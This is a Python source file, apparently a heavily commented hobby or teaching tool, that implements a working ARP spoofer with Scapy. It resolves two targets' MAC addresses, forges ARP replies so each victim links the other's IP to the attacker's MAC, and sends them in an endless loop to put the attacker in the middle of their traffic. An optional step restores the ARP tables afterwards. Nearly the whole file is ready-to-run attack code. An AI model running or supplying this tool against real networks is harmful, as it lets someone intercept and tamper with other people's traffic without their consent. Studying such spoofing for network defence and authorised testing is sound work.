#!/usr/bin/env python
#
# PYTHON ARP SPOOFER - COMMENTED VERSIOIN
#
# Author: Matheus Heidemann
#
# Description: this is a ARP spoofer script created with Python using Scapy. 
#
# 02 August 2022
#
# Version: 1.0.0
#
# License: MIT License


# IMPORTS
import argparse
import re
import subprocess
import sys
from time import sleep
import scapy.all as scapy
from util import helper

# MISC
# This is a IPv4 regex pattern to validate the user inputed target's IPv4s
valid_ipv4_addr = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"


# FUNCTIONS
# Function to get the arguments
def getArguments():

    # Creating an argument parser and it's description
    parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
    # Creating an argument called "target"
    parser.add_argument("-t", "--target", nargs="*", action="store", help="The two targets distinct IPv4 addresses (Example.: -t 192.168.0.100 192.168.0.200)")
    # Parsing the arguments to the variable "args". The "target" argument should be inputed in the terminal by the user, cause if didn't, 
    # the script will not work and will quit
    args = parser.parse_args()

    # If the user passed 2 values to the argument target
    if len(args.target) == 2:
        # Validating the target 1 IPv4
        while True:
            # Checking the first target IPv4 to see if it is an valid IPv4
            if re.match(valid_ipv4_addr, args.target[0]):
                break
            # If the regex above returned an error, it will call the function "newIPv4", which will return an error and asks the user for 
            # a new IPv4 for the target in question
            else:
                args.target[0] = newIPv4(args.target[0], 1)

        # Validating the target 2 IPv4
        while True:
            # Checking the seconds target IPv4 to see if it is an valid IPv4
            if re.match(valid_ipv4_addr, args.target[1]):
                break
            # If the regex above returned an error, it will call the function "newIPv4", which will return an error and asks the user for 
            # a new IPv4 for the target in question
            else:
                args.target[1] = newIPv4(args.target[1], 2)
        
        # Returning the args with the valid IPv4 values
        return args

    # If the user didn't passed 2 values to the argument target, the script will return an fatal error and quit
    else:
        print("ERROR - You must provide two valid IPv4 address!")
        print("Quitting...")
        quit()


# Function to set a new IPv4 address when the inputed target IPv4 is not valid
def newIPv4(target, index):
    # The "target" argument is basically the IPv4, while the "index" is just to print if the target with the invalid IPv4 in question is 
    # the first or second target
    print(f"Invalid target {index} IPv4 ({target}). Please, enter a valid IPv4 address")
    # Returning a new IPv4 address. If the user inputs any random value or invalid IPv4, the regex in the "getArguments" function will 
    # handle it
    return str(input(f"New target {index} IPv4 > "))


# Function to get the MAC address of the target
def getMACFromTarget(target_ip):
    try:
        # Creating an ARP resquest with the target's IP
        arp_request = scapy.ARP(pdst=target_ip)
        # Setting the ARP request destination to "ff:ff:ff:ff:ff:ff", which is the Broadcast channel                                      
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # The ARP packet with the broadcast MAC and the ARP request for the target IP
        arp_request_broadcast = broadcast/arp_request
        # The "srp" stands for "Send and receive packets". This function from scapy will just send the ARP pack with the target IP to the 
        # broadcast channel, so we can get the current MAC address from this target. This function returns two lists: one is the 
        # "answered" and the other one is the "unanswered". As we are only interested in the answered responses, the second list will not 
        # help us, so that's why there is a "[0]" at the end
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        # Returning only the MAC address of the target in the list
        return answered_list[0][1].hwsrc
    except:
        # If the user don't get any response from the provided IPv4, the script will return an error and exit
        print(f"\nERROR - The IPv4 {target_ip} didn't return any response. Try a different one.")
        print("Quitting...")
        quit()


# Function to get the attacker's machine MAC address
def getAttackerMAC():
    # Basically this two lines bellow are just to print the Linux command "ip link show" and then only get the MAC address using regex
    output = subprocess.check_output("ip link show", shell=True).decode()
    return re.search("ether (.+) ", output).group().split()[1].strip()


# Function to create an ARP packet
def createMaliciousPacket(target_ip, spoof_ip):
    return scapy.ARP(
        # op=2 means "is at", so our ARP packet will be used to notify both targets who has the IPv4 with the MAC address
        op=2,
        # The pdst is IPv4 of the victim that will be fooled
        pdst=target_ip,
        # The MAC address of the victim's machine         
        hwdst=getMACFromTarget(target_ip),
        # The MAC address of the attacker's machines
        hwsrc=getAttackerMAC(),
        # The IPv4 that the attacker is pretteding to be
        psrc=spoof_ip)
        # With these two last arguments, the ARP packet sent to the target IPv4 will make the target think that the another target IPv4 
        # is 
        # actually the attacker MAC address, while, in reality, it's not. That's how the attacker will fool the target 1 be preteding to 
        # be the target 2


# Function to create an restore ARP packet
def createRestorePacket(target1, target2):
    # Returning an ARP packet that has all the correct values for the targets, so the ARP tables will be intact
    return scapy.ARP(
        op=2,
        pdst=target1["ip"],
        hwdst=target1["mac"],
        hwsrc=target2["mac"],
        psrc=target2["ip"])


# Function to restore the default ARP tables from the targets
def restoreArpTables(target1, target2):
    # Creating an packet to restore the ARP table of the first target
    restore_packet1 = createRestorePacket(target1, target2)
    # Creating an packet to restore the ARP table of the second target
    restore_packet2 = createRestorePacket(target2, target1)
    # Sending the restore packet to the first target.The packet is sent 4 times to prevent any issues
    scapy.send(restore_packet1, count=4, verbose=False)
    # Sending the restore packet to the second target. The packet is sent 4 times to prevent any issues
    scapy.send(restore_packet2, count=4, verbose=False)
    # Priting and then exiting the script
    print("ARP tables restored.")
    print("Quitting the script...")
    quit()


# Function to spoof the targets
def spoofTargets(malicious_packet1, malicious_packet2, packets_per_sec, old_targets_ip_mac):
    try:
        # Priting what is about to happen
        print("\nStarting the spoof...")
        print(f"Sending ARP packets to {malicious_packet1.pdst} and {malicious_packet2.pdst} every {packets_per_sec} seconds.")
        # Creating an variable to store how many ARP packets are sended in total. This is necessary because the targets can send a new ARP 
        # packet that will update their ARP tables to the correct values (so the spoofing will not work anymore)
        packet_send_count = 0
        # Sending the malicious packets in a infinite loop. Can be cancelled by pressing "CTRL + C"
        while True:
            # Sending the malicious ARP packet to the first target
            scapy.send(malicious_packet1, verbose=False)
            # Sending the malicious ARP packet to the first target
            scapy.send(malicious_packet2, verbose=False)
            # Adding +2 to the packet send count every loop
            packet_send_count = packet_send_count + 2
            # Dynamically priting the packets that were sent
            print("\r[+] Sent " + str(packet_send_count) + " packets...",  end="")
            sys.stdout.flush()
            # Sleeping the packet sending for the user defined time. Without the sleep, the targets network would recieve a lot of ARP 
            # packets, which is suspicious and can cause the network to stutter
            sleep(packets_per_sec)
    # If the user stops the packet sending by pressing "CTRL + V"
    except KeyboardInterrupt:
        print("\n\nDetected CTRL + C from the user. Stopping the spoofing!")
        # Storing in a variable the answer of the user for restoring or not the target's ARP tables
        restore = helper.checkStringYesOrNo("Restore the previous ARP tables from the targets? [Y/n] > ", "Y")
        # If the user choose to restore the target's ARP tables
        if restore == "Y":
            # Passing the both targets IP and MAC that were stored at the beginning of the script
            restoreArpTables(old_targets_ip_mac[0], old_targets_ip_mac[1])
        # If the user choose to not restore the targets's ARP tables
        else:
            print("ARP tables not restored.")
            print("Quitting the script...")
            quit()


# Function to run the program
def run():
    # Check if user is running as sudo or root
    helper.check_privileges()

    # Get the target argument values
    args = getArguments()
    print("")

    # Store the current MAC addresses from the targets IPv4s
    old_targets_ip_mac = []
    for target in args.target:
        # Creating a dictionary to store the IP and MAC of each target
        target_dict = {"ip": target, "mac": getMACFromTarget(target)}
        old_targets_ip_mac.append(target_dict)

    # Target 1: creating a new malicious ARP packet and check if the target is listening
    malicious_packet1 = createMaliciousPacket(args.target[0], args.target[1])
    print(f"{args.target[0]} is listening and ready to be spoofed.")

    # Target 2: creating another malicious ARP packet and check if is the target listening
    malicious_packet2 = createMaliciousPacket(args.target[1], args.target[0])
    print(f"{args.target[1]} is listening and ready to be spoofed.")

    # Define the packets per seconds that should be sent
    packets_per_sec = helper.checkNumInt("\nPacket sending interval (default is 2) > ", 2)

    # Spoof the targets
    spoofTargets(malicious_packet1, malicious_packet2, packets_per_sec, old_targets_ip_mac)


# MAIN
if __name__ == "__main__":
    run()
